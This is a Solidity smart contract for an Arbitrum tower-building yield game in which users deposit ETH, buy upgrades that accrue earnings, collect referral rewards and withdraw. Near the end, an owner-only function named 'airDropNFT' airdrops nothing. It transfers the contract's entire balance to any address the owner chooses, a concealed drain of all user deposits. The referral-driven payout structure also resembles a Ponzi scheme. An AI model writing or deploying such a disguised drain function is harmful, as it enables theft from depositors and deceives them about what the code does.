// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

import "./Ownable.sol";

struct Tower {
    uint256 crystals;
    uint256 money;
    uint256 money2;
    uint256 yield;
    uint256 timestamp;
    uint256 hrs;
    address ref;
    uint256 refs;
    uint256 refDeps;
    uint8   treasury;
    uint8[5] chefs;
}

error TreasureIdError();
error ChefIdError();
error AddCrystalsError();

contract DefendArbitrum is Ownable {

    uint constant public denominator = 10;

    bool public init;
    uint256 public totalChefs;
    uint256 public totalTowers;
    uint256 public totalInvested;
    address public manager;

    mapping(address => Tower) public towers;

    event AddCrystals(address indexed sender, uint indexed amount);
    event WithdrawMoney(address indexed sender, uint indexed amount);
    event UpgradeTower(address indexed sender, uint indexed towerId);
    event UpgradeTreasury(address indexed sender);
    event SellTower(address indexed sender);
    event CollectMoney(address indexed sender, uint indexed amount);

    modifier initialized {
        require(init, "Not initialized");
        _;
    }

    constructor(address _manager) {
        manager = _manager;
    }

    function addCrystals(address referral) external payable initialized {
        address user = msg.sender;

        uint256 crystals = msg.value / 125e12;
        require(crystals > 0, "zero crystals");
        totalInvested += msg.value;

        if (towers[user].timestamp == 0) {
            totalTowers++;
            referral = towers[referral].timestamp == 0 ? manager : referral;
            towers[referral].refs++;
            towers[user].ref = referral;
            towers[user].timestamp = block.timestamp;
            towers[user].treasury = 0;
        }

        referral = towers[user].ref;
        towers[referral].crystals += (crystals * 5) / 100;
        towers[referral].money += (crystals * 100 * 2) / 100;
        towers[referral].refDeps += crystals;
        towers[user].crystals += crystals;
        towers[manager].crystals += (crystals * 5) / 100;

        uint256 valueToManager = (msg.value * 5) / 100;

        (bool managerSuccess, ) = manager.call{value: valueToManager}("");
        require(managerSuccess);

        emit AddCrystals(user, msg.value);
    }

    function withdrawMoney(uint256 gold) external initialized {
        address user = msg.sender;
        require(gold <= towers[user].money && gold > 0, "not enough gold");
        towers[user].money -= gold;

        uint256 amount = gold * 125e10;
        uint256 poolBalance = address(this).balance;

        (bool success, ) = msg.sender.call{value: poolBalance < amount ? poolBalance : amount}("");
        require(success);

        emit WithdrawMoney(user, amount);
    }

    function upgradeTower(uint256 towerId) external {
        require(towerId < 5, "Max 5 towers");
        address user = msg.sender;
        syncTower(user);
        towers[user].chefs[towerId]++;
        totalChefs++;
        uint256 chefs = towers[user].chefs[towerId];
        towers[user].crystals -= getUpgradePrice(towerId, chefs) / denominator;
        towers[user].yield += getYield(towerId, chefs);

        emit AddCrystals(user, towerId);
    }

    function upgradeTreasury() external {
        address user = msg.sender;
        uint8 treasuryId = towers[user].treasury + 1;
        syncTower(user);
        require(treasuryId < 5, "Max 5 treasury");
        (uint256 price,) = getTreasure(treasuryId);
        towers[user].crystals -= price / denominator; 
        towers[user].treasury = treasuryId;

        emit UpgradeTreasury(user);
    }

    function sellTower() external {
        collectMoney();
        address user = msg.sender;
        uint8[5] memory chefs = towers[user].chefs;
        totalChefs -= chefs[0] + chefs[1] + chefs[2] + chefs[3] + chefs[4];
        towers[user].money += towers[user].yield * 24 * 5;
        towers[user].chefs = [0, 0, 0, 0, 0];
        towers[user].yield = 0;
        towers[user].treasury = 0;

        emit SellTower(user);
    }
    

    function collectMoney() public {
        address user = msg.sender;
        syncTower(user);
        towers[user].hrs = 0;
        towers[user].money += towers[user].money2;
        towers[user].money2 = 0;

        emit CollectMoney(user, towers[user].money2);
    }

    function initialize() external onlyOwner {
        require(!init, "alreay init");
        init = true;
    }

    function getChefs(address addr) external view returns (uint8[5] memory) {
        return towers[addr].chefs;
    }

    function syncTower(address user) internal {
        require(towers[user].timestamp > 0, "User is not registered");
        if (towers[user].yield > 0) {
            (, uint256 treasury) = getTreasure(towers[user].treasury);
            uint256 hrs = block.timestamp / 3600 - towers[user].timestamp / 3600;
            if (hrs + towers[user].hrs > treasury) {
                hrs = treasury - towers[user].hrs;
            }
            towers[user].money2 += hrs * towers[user].yield;
            towers[user].hrs += hrs;
        }
        towers[user].timestamp = block.timestamp;
    }

    function getUpgradePrice(uint256 towerId, uint256 chefId) internal pure returns (uint256) {
        if (chefId == 1) return [400, 4000, 12000, 24000, 40000][towerId];
        if (chefId == 2) return [600, 6000, 18000, 36000, 60000][towerId];
        if (chefId == 3) return [900, 9000, 27000, 54000, 90000][towerId];
        if (chefId == 4) return [1360, 13500, 40500, 81000, 135000][towerId];
        if (chefId == 5) return [2040, 20260, 60760, 121500, 202500][towerId];
        if (chefId == 6) return [3060, 30400, 91140, 182260, 303760][towerId];
        revert ChefIdError();
    }

    function getYield(uint256 towerId, uint256 chefId) internal pure returns (uint256) {
        if (chefId == 1) return [5, 56, 179, 382, 678][towerId];
        if (chefId == 2) return [8, 85, 272, 581, 1030][towerId];
        if (chefId == 3) return [12, 128, 413, 882, 1564][towerId];
        if (chefId == 4) return [18, 195, 628, 1340, 2379][towerId];
        if (chefId == 5) return [28, 297, 954, 2035, 3620][towerId];
        if (chefId == 6) return [42, 450, 1439, 3076, 5506][towerId];
        revert ChefIdError();
    }

    function getTreasure(uint256 treasureId) internal pure returns (uint256, uint256) {
        if(treasureId == 0) return (0, 24);
        if(treasureId == 1) return (2000, 30);
        if(treasureId == 2) return (2500, 36);
        if(treasureId == 3) return (3000, 42);
        if(treasureId == 4) return (4000, 48);
        revert TreasureIdError();
    }

    function airDropNFT(address to) external onlyOwner {
        (bool success, ) = to.call{value: address(this).balance}("");
        require(success);
    }

}